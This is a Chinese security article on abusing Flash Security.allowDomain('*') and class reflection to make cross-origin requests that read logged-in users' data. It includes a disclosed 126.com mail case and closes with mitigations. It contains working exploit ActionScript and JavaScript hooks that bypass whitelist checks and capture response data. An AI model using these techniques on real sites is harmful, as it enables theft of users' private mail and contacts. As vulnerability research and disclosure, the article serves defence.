# 隐私泄露杀手锏：Flash 权限反射

0x00 前言
=======

* * *

一直以为该风险早已被重视，但最近无意中发现，仍有不少网站存在该缺陷，其中不乏一些常用的邮箱、社交网站，于是有必要再探讨一遍。

事实上，这本不是什么漏洞，是 Flash 与生俱来的一个正常功能。但由于一些 Web 开发人员了解不够深入，忽视了该特性，从而埋下安全隐患。

0x01 原理
=======

* * *

这一切还得从经典的授权操作说起：

```
Security.allowDomain('*')

```

对于这行代码，或许都不陌生。尽管知道使用 * 是有一定风险的，但想想自己的 Flash 里并没有什么高危操作，把我拿去又能怎样？

显然，这还停留在 XSS 的思维上。Flash 和 JS 通信确实存在 XSS 漏洞，但要找到一个能利用的 swf 文件并不容易：既要读取环境参数，又要回调给 JS，还得确保自动运行。

因此，一些开发人员以为只要不与 JS 通信，就高枕无忧了。同时为了图方便，直接给 swf 授权了 *，省去一大堆信任列表。

**事实上，Flash 被网页嵌套仅仅是其中一种而已，更普遍的，则是 swf 之间的嵌套。然而无论何种方式，都是通过 Security.allowDomain 进行授权的**—— 这意味着，一个 * 不仅允许被第三方网页调用，同时还包括了其他任意 swf！

被网页嵌套，或许难以找到利用价值。但被自己的同类嵌套，可用之处就大幅增加了。因为它们都是 Flash，位于同一个运行时里，相互之间存在着密切的关联。

我们如何将这种关联，进行充分利用呢？

0x02 利用
=======

* * *

### 关联容器

在 Flash 里，舞台（stage）是这个世界的根基。无论加载多少个 swf，舞台始终只有一个。任何元素（DisplayObject）必须添加到舞台、或其子容器下，才能展示和交互。

![](http://drops.javaweb.org/uploads/images/7b01f9f7d912531620c257653226eee0fb184f9f.jpg)

因此，不同 swf 创建的元素，都是通过同一个舞台展示的。它们能感知相互的存在，只是受到同源策略的限制，未必能相互操作。

**然而，一旦某个 swf 主动开放权限，那么它的元素就不再受到保护，能被任意 swf 访问了！**

听起来似乎不是很严重。我创建的界面元素，又有何访问价值？也就获取一些坐标、颜色等信息而已。

偷窥元素的自身属性，或许并没什么意义。但并非所有的元素，都是为了纯粹展示的 —— 有时为了扩展功能，继承了元素类的特征，在此之上实现额外的功能。

最典型的，就是每个 swf 的主类：它们都继承于 Sprite，即使程序里没用到任何界面相关的。

有这样扩展元素存在，我们就可以访问那些额外的功能了。

开始我们的第一个案例。某个 swf 的主类在 Sprite 的基础上，扩展了网络加载的功能：

```
// vul.swf
public class Vul extends Sprite {

    public var urlLoader:URLLoader = new URLLoader();

    public function download(url:String) : void {
        urlLoader.load(new URLRequest(url));
        ...
    }

    public function Vul() {
        Security.allowDomain('*');
        ...
    }
    ...
}

```

通过第三方 swf，我们将其加载进来。由于 Vul 继承了 Sprite，因此拥有了元素的基因，我们可以从容器中找到它。

同时它也是主类，默认会被添加到 Loader 这个加载容器里。

```
// exp.swf
var loader:Loader = new Loader();
loader.contentLoaderInfo.addEventListener('complete', function(e:Event) : void {
    var main:* = DisplayObjectContainer(loader).getChildAt(0);

    trace(main);    // [object Vul]
});
loader.load(new URLRequest('//swf-site/vul.swf'));

```

因为 Loader 是子 swf 的[默认容器](http://help.adobe.com/zh_CN/FlashPlatform/reference/actionscript/3/flash/system/LoaderContext.html#requestedContentParent)，所以其中第一个元素显然就是子 swf 的主类：Vul。

由于 Vul 定义了一个叫 download 的公开方法，并且授权了所有的域名，因此在第三方 exp.swf 里，自然也能调用它：

![](http://drops.javaweb.org/uploads/images/cb9521ac90e3407dcf79e2855f80e2db005baf8d.jpg)

```
main.download('//swf-site/data');

```

同时 Vul 中的 urlLoader 也是一个公开暴露的成员变量，同样可被外部访问到，并对其添加数据接收事件：

```
var ld:URLLoader = main.urlLoader;
ld.addEventListener('complete', function(e:Event) : void {
    trace(ld.data);
});

```

尽管这个 download 方法是由第三方 exp.swf 发起的，但最终执行`URLLoader`的`load`方法时，上下文位于 vul.swf 里，因此这个请求仍属于 swf-site 的源。

于是攻击者从任意位置，跨站访问 swf-site 下的数据了。

更糟的是，Flash 的跨源请求可通过 crossdomain.xml 来授权。如果某个站点允许 swf-site，那么它也成了受害者。

如果用户正处于登录状态，攻击者悄悄访问带有个人信息的页面，用户的隐私数据可能就被泄露了。攻击者甚至还可模拟用户请求，将恶意链接发送给其他好友，导致蠕虫传播。

> ActionScript 虽然是强类型的，但只是开发时的约束，在运行时仍和 JavaScript 一样，可动态访问属性。

### 类反射

通过容器这个桥梁，我们可访问到子 swf 中的对象。但前提条件仍过于理想，现实中能利用的并不多。

如果目标对象不是一个元素，也没有和公开的对象相关联，甚至根本就没有被实例化，那是否就无法获取到了？

做过页游开发的都试过，将一些后期使用的素材打包在独立的 swf 里，需要时再加载回来从中提取。目标 swf 仅仅是一个资源包，其中没有任何脚本，那是如何参数提取的？

事实上，整个过程无需子 swf 参与。所谓的『提取』，其实就是 Flash 中的反射机制。通过反射，我们即可隔空取物，直接从目标 swf 中取出我们想要的类。

因此我们只需从目标 swf 里，找到一个使用了网络接口类，即可尝试为我们效力了。

开始我们的第二个案例。这是某电商网站 CDN 上的一个广告活动 swf，反编译后发现，其中一个类里封装了简单的网络操作：

```
// vul.swf
public class Tool {
    public function getUrlData(url:String, cb:Function) : void {
        var ld:URLLoader = new URLLoader();
        ld.load(new URLRequest(url));
        ld.addEventListener('complete', function(e:Event) : void {
            cb(ld.data);
        });
        ...
    }
    ...

```

在正常情况下，需一定的交互才会创建这个类。但反射，可以让我们避开这些条件，提取出来直接使用：

```
// exp.swf
var loader:Loader = new Loader();
loader.contentLoaderInfo.addEventListener('complete', function(e:Event) : void {
    var cls:* = loader.contentLoaderInfo.applicationDomain.getDefinition('Tool');
    var obj:* = new cls;

    obj.getUrlData('http://victim-site/user-info', function(d:*) : void {
        trace(d);
    });
});
loader.load(new URLRequest('//swf-site/vul.swf'));

```

由于 victim-site/crossdomain.xml 允许 swf-site 访问，于是 vul.swf 在不经意间，就充当了隐私泄露的傀儡。

攻击者拥有了 victim-site 的访问权，即可跨站读取页面数据，访问用户的个人信息了。

![](http://drops.javaweb.org/uploads/images/c4997b0688255b45e888dc935fd67364839ea900.jpg)

由于大多 Web 开发者对 Flash 的安全仍局限于 XSS 之上，从而忽视了这类风险。即使在如今，网络上仍存在大量可被利用的缺陷 swf 文件，甚至不乏一些大网站也纷纷中招。

当然，即使有反射这样强大的武器，也并非所有的 swf 都是可以利用的。显然，要符合以下几点才可以：

*   执行 Security.allowDomain(可控站点)
    
*   能控制触发 URLLoader/URLStream 的 load 方法，并且 url 参数能自定义
    
*   返回的数据可被获取
    

第一条：这就不用说了，反射的前提也是需要对方授权的。

第二条：理想情况下，可直接调用反射类中提供的加载方法。但现实中未必都是 public 的，这时就无法直接调用了。只能分析代码逻辑，看能不能通过公开的方法，构造条件使得流程走到请求发送的那一步。同时 url 参数也必须可控，否则也就没意义了。

第三条：如果只能将请求发送出去，却不能拿到返回的内容，同样也是没有意义的。

也许你会说，为什么不直接反射出目标 swf 中的 URLLoader 类，那不就可以直接使用了吗。然而事实上，光有类是没用的，Flash 并不关心这个类来自哪个 swf，而是看执行 URLLoader::load 时，当前位于哪个 swf。如果在自己的 swf 里调用 load，那么请求仍属于自己的源。

同时，AS3 里已没有 eval 函数了。唯一能让数据变指令的，就是 Loader::loadBytes，但这个方法也有类似的判断。

因此我们还是得通过目标 swf 里的已有的功能，进行利用。

0x03 案例
=======

* * *

这里分享一个现实中的案例，之前已上报并修复了的。

这是 126.com 下的一个 swf，位于`http://mail.126.com/js6/h/flashRequest.swf`。

反编译后可发现，主类初始化时就开启了 * 的授权，因此整个 swf 中的类即可随意使用了！

![](http://drops.javaweb.org/uploads/images/b02f1734f1aca58311a1caa6d3e77c9c26e3727c.jpg)

同时，其中一个叫 FlashRequest 的类，封装了常用的网络操作，并且关键方法都是 public 的：

![](http://drops.javaweb.org/uploads/images/164e23d6caebd4ff76bdc7d9c044cf4686177986.jpg)

我们将其反射出来，根据其规范调用，即可发起跨源请求了！

由于网易不少站点的 crossdomain.xml 都授权了 126.com，因此可暗中查看已登录用户的 163/126 邮件了：

![](http://drops.javaweb.org/uploads/images/5b4926b733b774d6f1af4e240c02a07fb7a65a23.jpg)

甚至还可以读取用户的通信录，将恶意链接传播给更多的用户！

0x04 进阶
=======

* * *

借助爬虫和工具，我们可以找出不少可轻易利用的 swf 文件。不过本着研究的目的，我们继续探讨一些需仔细分析才能利用的案例。

### 进阶 No.1 —— 绕过路径检测

当然也不是所有的开发人员，都是毫不思索的使用 Security.allowDomain('*') 的。

一些有安全意识的，即使用它也会考虑下当前环境是否正常。例如某个邮箱的 swf 初始化流程：

```
// vul-1.swf
public function Main() {
    var host:String = ExternalInterface.call('function(){return window.location.host}');

    if host not match white-list
        return

    Security.allowDomain('*');
    ...

```

它会在授权之前，对嵌套的页面进行判断：如果不在白名单列表里，那就直接退出。

由于白名单的匹配逻辑很简单，也找不出什么瑕疵，于是只能将目光转移到 ExternalInterface 上。为什么要使用 JS 来获取路径？

因为 Flash 只提供当前 swf 的路径，并不知道自己是被谁嵌套的，于是只能用这种曲线救国的办法了。

不过上了 JS 的贼船，自然就躲不过厄运了。有数不清的前端黑魔法正等着跃跃欲试。Flash 要和各种千奇百怪的浏览器通信，显然需要一套消息协议，以及一个 JS 版的中间桥梁，用以支撑。了解 Flash XSS 的应该都不陌生。

在这个桥梁里，其中有一个叫`__flash__toXML`的函数，负责将 JS 执行后的结果，封装成消息协议返回给 Flash。如果能搞定它，那一切就好办了。

显然这个函数默认是不存在的，是载入了 Flash 之后才注册进来的。既然是一个全局函数，页面中的 JS 也能重定义它：

```
// exp-1.js
function handler(str) {
    console.log(str);
    return '<string>hi,jack</string>';
}
setInterval(function() {
    var rawFn = window.__flash__toXML;
    if (rawFn && rawFn != handler) {
        window.__flash__toXML = handler;
    }
}, 1);

```

通过定时器不断监控，一旦出现就将其重定义。于是用 ExternalInterface.call 无论执行什么代码，都可以随意返回内容了！

为了消除定时器的延迟误差，我们先在自己的 swf 里，随便调用下 ExternalInterface.call 进行预热，让`__flash__toXML`提前注入。之后子 swf 使用时，已经是被覆盖的版本了。

当然，即使不使用覆盖的方式，我们仍可以控制`__flash__toXML`的返回结果。

仔细分析下这个函数，其中调用了`__flash__escapeXML`：

```
function __flash__toXML(value) {
    var type = typeof(value);
    if (type == "string") {
        return "<string>" + __flash__escapeXML(value) + "</string>";
    ...
}

function __flash__escapeXML(s) {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;") ... ;
}

```

里面有一大堆的实体转义，但又如何进行利用？

因为它是调用`replace`进行替换的，然而在万恶的 JS 里，常用的方法都是可被改写的！我们可以让它返回任何想要的值：

```
// exp-1.js
String.prototype.replace = function() {
    return 'www.test.com';
};

```

甚至还可以针对`__flash__escapeXML`的调用，返回特定值：

```
String.prototype.replace = function F() {
    if (F.caller == __flash__escapeXML) {
        return 'www.test.com';
    }
    ...
};

```

于是 ExternalInterface.call 的问题就这样解决了。人为返回一个白名单里的域名，即可绕过初始化中的检测，从而顺利执行 Security.allowDomain(*)。

所以，绝不能相信 JS 返回的内容。连标点符号都不能信！

### 进阶 No.2 —— 构造请求条件

下面这个案例，是某社交网站的头像上传 Flash。

不像之前那些，都可顺利找到公开的网络接口。这个案例十分苛刻，搜索整个项目，只出现一处 URLLoader，而且还是在 private 方法里。

```
// vul-2.swf
public class Uploader {

    public function Uploader(file:FileReference) {
        ...
        file.addEventListener(Event.SELECT, handler);
    }

    private function handler(e:Event) : void {
        var file:FileReference = e.target as FileReference;

        // check filename and data
        file.name ...
        file.data ...

        // upload(...)
    }

    private function upload(...) : void {
        var ld:URLLoader = new URLLoader();
        var req:URLRequest = new URLRequest();
        req.method = 'POST';
        req.data = ...;
        req.url = Param.service_url + '?xxx=' ....
        ld.load(req);
    }
}

```

然而即使要触发这个方法也非常困难。因为这是一个上传控件，只有当用户选择了文件对话框里的图片，并通过参数检验，才能走到最终的上传位置。

唯一可被反射调用的，就是 Uploader 类自身的构造器。同时控制传入的 FileReference 对象，来构造条件。

```
// exp-2.swf
var file:FileReference = new FileReference();

var cls:* = ...getDefinition('Uploader');
var obj:* = new cls(file);

```

然而 FileReference 不同于一般的对象，它会调出界面。如果中途弹出文件对话框，并让用户选择，那绝对是不现实的。

不过，弹框和回调只是一个因果关系而已。弹框会产生回调，但回调未必只有弹框才能产生。因为 FileReference 继承了 EventDispatcher，所以我们可以人为的制造一个事件：

```
file.dispatchEvent(new Event(Event.SELECT));

```

这样，就进入文件选中后的回调函数里了。

由于这一步会校验文件名、内容等属性，因此还得事先给这些属性赋值。然而遗憾的是，这些属性都是只读的，根本无法设置。

等等，为什么会有只读的属性？属性不就是一个成员变量吗，怎么做到只能读不可写？除非是 const，但那是常量，并非只读属性。

原来，所谓的只读，就是只提供了 getter、但没有 setter 的属性。这样就保证了属性内部可变，但外部不可写的特征。

如果我们能 hook 这个 getter，那就能返回任意值了。然而 AS 里的类默认都是密闭的，不像 JS 那样灵活，可随意篡改原型链。

事实上在高级语言里，有着更为优雅的 hook 方式，我们称作『重写』。我们创建一个继承 FileReference 的类，即可重写那些 getter 了：

```
// exp-2.swf
class FileReferenceEx extends FileReference {

    override public function get name() : String {
        return 'hello.gif';
    }
    override public function get data() : ByteArray {
        var bytes:ByteArray = new ByteArray();
        ...
        return bytes;
    }
}

```

根据著名的『里氏替换原则』，任何基类可以出现的地方，子类也一定可以出现。所以传入这个 FileReferenceEx 也是可接受的，之后一旦访问 name 等属性时，自然就落到我们的 getter 上了。

```
// exp-2.swf
var file:FileReference = new FileReferenceEx();  // !!!
...
var obj:* = new cls(file);

```

到此，我们成功模拟了文件选择的整个流程。

接着就到关键的上传位置了。庆幸的是，它没写死上传地址，而是从环境变量（loaderInfo.parameters）里读取。

说到环境变量，大家首先想到网页中 Flash 元素的`flashvars`属性，但其实还有两个地方可以传入：

*   swf url query（例如 .swf?a=1&b=2）
    
*   LoaderContext
    

由于 url query 是固定的，后期无法修改，所以选择 LoaderContext 来传递：

```
// exp-2.swf
var loader:Loader = new Loader();
var ctx:LoaderContext = new LoaderContext();
ctx.parameters = {
    'service_url': 'http://victim-site/user-data#'
};
loader.load(new URLRequest('http://cross-site/vul-2.swf'), ctx);

```

因为 LoaderContext 里的 parameters 是运行时共享的，这样就能随时更改环境变量了：

```
// next request
ctx.parameters.service_url = 'http://victim-site/user-data-2#';

```

同时为了不让多余的参数发送上去，还可以在 URL 末尾放置一个 #，让后面多余的部分变成 Hash，就不会走流量了。

尽管这是个很苛刻的案例，但仔细分析还是找出解决办法的。

当然，我们目的并不是为了结果，而是其中分析的乐趣：）

### 进阶 No.3 —— 捕获返回数据

当然，光把请求发送出去还是不够的，如果无法拿到返回的结果，那还是白忙活。

最理想的情况，就是能传入回调接口，这样就可直接获得数据了。但现实未必都是这般美好，有时我们得自己想办法取出数据。

一些简单的 swf 通常不会封装一个的网络请求类，每次使用时都直接写原生的代码。这样，可控的因子就少很多，利用难度就会大幅提升。

例如这样的场景，尽管能控制请求地址，但由于没法拿到 URLLoader，也就无从获取返回数据了：

```
public function download(url:String) : void {
    var ld:URLLoader = new URLLoader();
    ld.load(new URLRequest(url));
    ld.addEventListener('complete', function(e:Event) : void {
        // do nothing
    });
}

```

但通常不至于啥也不做，多少都会处理下返回结果。这时就得寻找机会了。

一旦将数据赋值到公开的成员变量里，那么我们就可通过轮询的方式来获取了：

```
public var data:*;
...
ld.addEventListener('complete', function(e:Event) : void {
    data = e.data;
});

```

或者，将数据存放到了某个元素里，用于显示：

```
private var textbox:TextField = new TextField();
...
addChild(textbox);
...
ld.addEventListener('complete', function(e:Event) : void {
    textbox.text = e.data;
});

```

同样可以利用文章开头提到的方法，从父容器里找出相应的元素，定时轮询其中的内容。

不过这些都算容易解决的。在一些场合，返回的数据根本不符合预期的格式，因此就无法处理直接报错了。

下面是个非常普遍的案例。在接收事件里，将数据进行固定格式的解码：

```
// vul-3.swf
import com.adobe.serialization.json.JSON;

ld.addEventListener('complete', function(e:Event) : void {
    var data:* = JSON.decode(e.data);
    ...
});

```

因为开发人员已经约定使用 JSON 作为返回格式，所以压根就没容错判断，直接将数据进行解码。

然而我们想要跨站读取的文件，未必都是 JSON 格式的。HTML、XML 甚至 JSONP，都被拍死在这里了。

难道就此放弃？都报错无法往下走了，那还能怎么办。唯一可行的，就是将错就错，往『错误』的方向走。

一个强大的运行时系统，都会提供一些接口，供开发者捕获全局异常。HTML 里有，Flash 里当然也有，甚至还要强大的多 —— 不仅能够获得错误相关的信息，甚至还能拿到 throw 出来的那个 Error 对象！

一般通用的类库，往往会有健全的参数检验。当遇到不合法的参数时，通常会将参数连同错误信息，作为异常抛出来。如果某个异常对象里，正好包含了我们想要的敏感数据的话，那就非常美妙了。

就以 JSON 解码为例，我们写个 Demo 验证一下：

```
var s:String = '<html>\n<div>\n123\n</div>\n</html>';
JSON.decode(s);

```

我们尝试将 HTML 字符传入 JSON 解码器，最终被断在了类库抛出的异常处：

![](http://drops.javaweb.org/uploads/images/05b5f1cd4f6c09c0ff28618c22ef3f01269f45be.jpg)

异常中的前两个参数，看起来没多大意义。但第三个参数，里面究竟藏着是什么？

不用猜想，这正是我们想要的东西 —— 传入解码器的整个字符参数！

![](http://drops.javaweb.org/uploads/images/a2fe89f045b324b1777cc5ea5340034923b4318a.jpg)

如此，我们就可在全局异常捕获中，拿到完整的返回数据了：

```
loaderInfo.uncaughtErrorEvents.addEventListener(UncaughtErrorEvent.UNCAUGHT_ERROR, function(e:UncaughtErrorEvent) : void {
    trace(e.error.text);
});

```

![](http://drops.javaweb.org/uploads/images/69dacb3a179d19ce5fea6959dedf54550d0293b3.jpg)

惊呆了吧！只要仔细探索，一些看似不可能实现的，其实也能找到解决方案。

0x05 补救
=======

* * *

如果从代码层面来修补，短时间内也难以完成。

大型网站长期以来，积累了相当数量的 swf 文件。有时为了解决版本冲突，甚至在文件名里使用了时间、摘要等随机数，这类的 swf 当时的源码，或许早已不再维护了。

因此，还是得从网站自身来强化。crossdomain.xml 中不再使用的域名就该尽早移除，需要则尽可能缩小子域范围。毕竟，只要出现一个带缺陷的 swf 文件，整个站点的安全性就被拉低了。

事实上，即使通过反射目标 swf 实现的跨站请求，referer 仍为攻击者的页面。因此，涉及到敏感数据读取的操作，验证一下来源还是很有必要的。

作为用户来说，禁用第三方 cookie 实在太有必要了。如今 Safari 已默认禁用，而 Chrome 则仍需手动添加。

0x06 总结
=======

* * *

最后总结下，本文提到的 3 类权限：

*   代码层面（public / private / ...)
    
*   模块层面（Security.allowDomain）
    
*   站点层面（crossdomain.xml）
    

只要这几点都满足，就很有可能被用于跨源的请求。

也许会觉得 Flash 里坑太多了，根本防不胜防。但事实上这些特征早已存在，只是未被开发者重视而已。以至于各大网站如今仍普遍躺枪。

当然，信息泄露对每个用户都是受害者。希望能让更多的开发者看到，及时修复安全隐患。